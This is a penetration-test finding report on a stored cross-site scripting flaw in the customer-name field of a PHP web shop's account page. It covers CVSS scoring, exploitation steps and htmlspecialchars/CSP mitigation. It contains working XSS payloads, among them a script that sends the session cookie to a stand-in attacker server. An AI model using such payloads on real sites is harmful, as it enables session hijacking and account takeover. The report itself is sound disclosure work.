# Finding 5: Stored Cross-Site Scripting (XSS)

[← Back to Finding Summary](./05-finding-summary.md) | [← Back to README](./README.md)

---

**CVSS Score: 9.3 (Critical)**  
**Category (OWASP):** Cross-Site Scripting  
**Affected Field:** Customer Name (`c_name`) in Edit Account

---

## Risk

The attacker successfully injected a malicious script that executes every time the page is visited — by both regular users and admin accounts. The primary risks are **session cookie theft**, **account takeover**, and **impersonation** using stolen session IDs.

---

## Severity

Classified as **Critical** because the impact can reach admin session theft, potentially leading to full system compromise without needing any further credential exploitation.

---

## CVSS Base Score Breakdown

| **Metric** | **Value** | **Reason** |
|---|---|---|
| Attack Vector | Network | Payload delivered through web input. |
| Attack Complexity | Low | Only requires simple script input in a form field. |
| Privileges Required | Low | Requires a regular user account — easily self-registered. |
| User Interaction | Required | Victim must open the page containing the payload. |
| Scope | Changed | If victim is an admin, the attack escalates from user panel to admin panel access. |
| Confidentiality Impact | High | Cookies and sensitive data can be stolen. |
| Integrity Impact | High | Attacker can perform actions on behalf of the victim. |
| Availability Impact | None | No direct impact on system availability. |

---

## Source Code Evidence

The `c_name` input field is rendered directly without sanitization — no special character escaping or validation is applied before output.

---

## Exploitation Steps

1. Log in as a customer, navigate to **My Account → Edit Account**.
2. In the **Customer Name** field, enter the payload:
   ```html
   <script>alert(document.cookie)</script>
   ```
   <img width="1093" height="387" alt="image" src="https://github.com/user-attachments/assets/93db0a87-461f-4c40-8213-ea2007e5c8ee" />

3. Click **Update Account**.
4. Reload the page — an alert dialog appears displaying the **PHPSESSID** cookie value.
   
   <img width="400" height="113" alt="image" src="https://github.com/user-attachments/assets/44ca9e8f-e7d5-47a3-9292-0d9f9c9ec19a" />

6. This payload also executes when an **admin** views the customer list in the admin panel.

---

## Attack Chain — Cookie Exfiltration

An attacker can silently send the stolen cookie to their own server:

```html
<script>
  document.location='http://attacker-server.com/steal?c=' + document.cookie
</script>
```

The attacker then uses the stolen `PHPSESSID` to impersonate the victim — including if the victim is an admin.

---

## Impact

- **Admin session cookie (PHPSESSID) theft** → admin account takeover without needing credentials.
- **Redirect victim** to phishing pages.
- **Execute actions on behalf of the victim** without their knowledge (CSRF-equivalent impact).

---

## Mitigation

Apply output encoding using `htmlspecialchars()` when displaying any user-supplied data:

```php
// ✅ Fixed
echo htmlspecialchars($customer_name, ENT_QUOTES, 'UTF-8');
```

Additional steps:
- Implement a **Content Security Policy (CSP)** header to restrict inline script execution.
- Apply server-side input validation — reject HTML characters such as `<`, `>`, `"`, `'`.
